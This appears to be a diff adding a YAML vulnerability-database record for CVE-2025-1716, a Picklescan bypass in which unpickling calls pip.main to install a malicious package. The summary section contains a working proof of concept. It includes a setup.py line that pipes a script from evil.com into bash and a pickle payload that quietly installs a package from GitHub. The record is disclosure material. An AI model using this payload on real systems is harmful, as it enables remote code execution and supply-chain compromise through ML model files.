@@ -1,0 +1,143 @@
+advisory_id: GHSA-655q-fx9r-782v
+datasource_id: github_osv/GHSA-655q-fx9r-782v
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-655q-fx9r-782v/GHSA-655q-fx9r-782v.json
+aliases:
+  - CVE-2025-1716
+summary: |
+  Picklescan Allows Remote Code Execution via Malicious Pickle File Bypassing Static Analysis
+  ### CVE-2025-1716
+
+  ### Summary
+  An unsafe deserialization vulnerability in Python’s pickle module allows an attacker to bypass static analysis tools like Picklescan and execute arbitrary code during deserialization. This can be exploited to run pip install and fetch a malicious package, enabling remote code execution (RCE) upon package installation.
+
+  ### Details
+  Pickle’s deserialization process allows execution of arbitrary functions via the __reduce__ method. While Picklescan is designed to detect such exploits, this attack evades detection by leveraging pip.main() as the callable function. Since pip is a legitimate package operation, it may not raise red flags in security scans.
+
+  The payload executes the following steps:
+
+  1. During unpickling, it calls pip.main() to install a malicious PyPI package.
+  2. The installed package runs arbitrary code via setup.py, entry_points, or post-install hooks.
+  3. Execution is silent, with minimal logging to avoid detection.
+
+  ### PoC
+
+  Step 1: Create the Malicious Package
+  Host a PyPI package with a malicious setup.py or entry_point.
+
+  Example malicious `setup.py`
+  ```
+  from setuptools import setup
+  import os
+
+  os.system("curl -s https://evil.com/payload.sh | bash")  # Executes remote shell script
+
+  setup(
+      name="rsac-demo-package",
+      version="0.1",
+      packages=["rsac_demo"],
+      install_requires=[],
+  )
+  ```
+  Upload it to PyPI or host on GitHub.
+
+  Step 2: Exploit via Pickle
+  ```
+  import pickle
+  import pip
+
+  class Exploit:
+      def __reduce__(self):
+          return pip.main, (
+              ['install', 'git+https://github.com/madgetr/rsac-demo-package', '--no-input', '-q', '-q', '-q',
+               '--exists-action', 'i', '--isolated'],
+          )
+
+  malicious_pickle = pickle.dumps(Exploit())
+
+  # Simulating deserialization attack
+  pickle.loads(malicious_pickle)
+  ```
+  This installs a malicious package from GitHub or PyPI.
+  The payload runs automatically when unpickled, executing any code inside the installed package leveraging the `setup.py` file.
+
+
+  ### Impact
+  Remote Code Execution (RCE): Any system that deserializes a malicious pickle is compromised.
+  Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.
+  Bypasses Picklescan: Security tools may not flag pip.main(), making it harder to detect.
+
+  ### Recommended Fixes
+  Add  `"pip": "*"` to the list of [unsafe globals](https://github.com/mmaitre314/picklescan/blob/25d753f4b9a27ce141a43df3bf88d731800593d9/src/picklescan/scanner.py#L96)
+impacted_packages:
+  - purl: pkg:pypi/picklescan
+    affected_versions: vers:pypi/<=0.0.21
+    fixed_versions: vers:pypi/0.0.22
+    affected_packages:
+      - pkg:pypi/picklescan@0.0.1
+      - pkg:pypi/picklescan@0.0.2
+      - pkg:pypi/picklescan@0.0.3
+      - pkg:pypi/picklescan@0.0.4
+      - pkg:pypi/picklescan@0.0.5
+      - pkg:pypi/picklescan@0.0.6
+      - pkg:pypi/picklescan@0.0.7
+      - pkg:pypi/picklescan@0.0.8
+      - pkg:pypi/picklescan@0.0.9
+      - pkg:pypi/picklescan@0.0.10
+      - pkg:pypi/picklescan@0.0.11
+      - pkg:pypi/picklescan@0.0.12
+      - pkg:pypi/picklescan@0.0.13
+      - pkg:pypi/picklescan@0.0.14
+      - pkg:pypi/picklescan@0.0.15
+      - pkg:pypi/picklescan@0.0.16
+      - pkg:pypi/picklescan@0.0.17
+      - pkg:pypi/picklescan@0.0.18
+      - pkg:pypi/picklescan@0.0.19
+      - pkg:pypi/picklescan@0.0.20
+      - pkg:pypi/picklescan@0.0.21
+    fixed_packages:
+      - pkg:pypi/picklescan@0.0.22
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/mmaitre314/picklescan
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/mmaitre314/picklescan
+        commit: 78ce704227c51f070c0c5fb4b466d92c62a7aa3d
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-655q-fx9r-782v/GHSA-655q-fx9r-782v.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-184
+references:
+  - url: https://github.com/mmaitre314/picklescan
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/commit/78ce704227c51f070c0c5fb4b466d92c62a7aa3d
+    reference_type:
+    reference_id:
+  - url: https://github.com/pypa/advisory-database/tree/main/vulns/picklescan/PYSEC-2025-18.yaml
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-1716
+    reference_type:
+    reference_id: CVE-2025-1716
+  - url: https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1716
+    reference_type:
+    reference_id: CVE-2025-1716
+  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-655q-fx9r-782v
+    reference_type:
+    reference_id: GHSA-655q-fx9r-782v
+exploits: []
